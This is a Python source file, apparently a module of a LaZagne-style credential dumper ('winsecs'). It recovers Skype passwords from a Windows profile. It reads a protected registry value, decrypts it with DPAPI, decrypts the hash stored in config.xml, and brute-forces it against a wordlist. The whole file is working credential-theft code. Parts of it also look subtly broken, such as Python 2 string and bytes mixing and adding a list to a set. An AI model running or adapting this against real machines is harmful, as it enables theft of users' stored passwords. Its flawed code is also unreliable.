# -*- coding: utf-8 -*-
import binascii
import hashlib
import os
import struct
from xml.etree.cElementTree import ElementTree

from winsecs.utils import OpenKey, winreg, log, CryptUnprotectData
from Crypto.Cipher import AES
from winsecs.dico import get_dic


class Skype:
    # get value used to build the salt
    def get_regkey(self, profile):
        try:
            key_path = 'Software\\Skype\\ProtectedStorage'
            try:
                hkey = OpenKey(winreg.HKEY_CURRENT_USER, key_path)
            except Exception as e:
                log.debug(str(e))
                return False

            # num = winreg.QueryInfoKey(hkey)[1]
            k = winreg.EnumValue(hkey, 0)[1]
            result_bytes = CryptUnprotectData(k, profile)
            return result_bytes.decode()
        except Exception as e:
            log.debug(str(e))
            return False

    # get hash from lazagne.configuration file
    def get_hash_credential(self, xml_file):
        tree = ElementTree(file=xml_file)
        encrypted_hash = tree.find('Lib/Account/Credentials3')
        if encrypted_hash is not None:
            return encrypted_hash.text
        else:
            return False

    # decrypt hash to get the md5 to bruteforce
    def get_md5_hash(self, enc_hex, key):
        # convert hash from hex to binary
        enc_binary = binascii.unhexlify(enc_hex)

        # retrieve the salt
        salt = hashlib.sha1('\x00\x00\x00\x00' + key).digest() + hashlib.sha1('\x00\x00\x00\x01' + key).digest()

        # encrypt value used with the XOR operation
        aes_key = AES.new(salt[0:32], AES.MODE_CBC, b'\x00' * 16).encrypt(struct.pack('I', 0) * 4)[0:16]

        # XOR operation
        decrypted = []
        for d in range(16):
            decrypted.append(struct.unpack('B', enc_binary[d])[0] ^ struct.unpack('B', aes_key[d])[0])

        # cast the result byte
        tmp = b''
        for dec in decrypted:
            tmp += struct.pack(">I", dec).strip(b'\x00')

        # byte to hex
        return binascii.hexlify(tmp)

    def dictionary_attack(self, login, md5):
        wordlist = get_dic()
        for word in wordlist:
            hash_ = hashlib.md5('%s\nskyper\n%s' % (login, word)).hexdigest()
            if hash_ == md5:
                return word

    def get_username(self, path):
        xml_file = os.path.join(path, 'shared.xml')
        if os.path.exists(xml_file):
            tree = ElementTree(file=xml_file)
            username = tree.find('Lib/Account/Default')
            try:
                return username.text
            except Exception:
                pass

    def get_info(self, key, username, path):
        if os.path.exists(os.path.join(path, 'config.xml')):
            values = {}

            try:
                values['Login'] = username

                # get encrypted hash from the config file
                enc_hex = self.get_hash_credential(os.path.join(path, 'config.xml'))

                if not enc_hex:
                    log.warning('No credential stored on the config.xml file.')
                else:
                    # decrypt the hash to get the md5 to brue force
                    values['Hash'] = self.get_md5_hash(enc_hex, key)
                    values['Pattern to bruteforce using md5'] = values['Login'] + '\\nskyper\\n<password>'

                    # Try a dictionary attack on the hash
                    password = self.dictionary_attack(values['Login'], values['Hash'])
                    if password:
                        values['Password'] = password

                    return list(values.values())
            except Exception as e:
                log.debug(str(e))

    def run(self, profile):
        path = os.path.join(profile['APPDATA'], 'Skype')
        if not os.path.exists(path):
            return

        pwd_found = set()
        # retrieve the key used to build the salt
        key = self.get_regkey(profile)
        if not key:
            log.error('Skype: The salt has not been retrieved')
            return

        username = self.get_username(path)
        d = os.path.join(path, username)
        if username and os.path.exists(d):
            info = self.get_info(key, username, d)
            if info:
                pwd_found.add(info)

        if not pwd_found:
            for d in os.listdir(path):
                info = self.get_info(key, d, os.path.join(path, d))
                if info:
                    pwd_found.add(info)

        return list(pwd_found)


modules = {"Skype": Skype()}
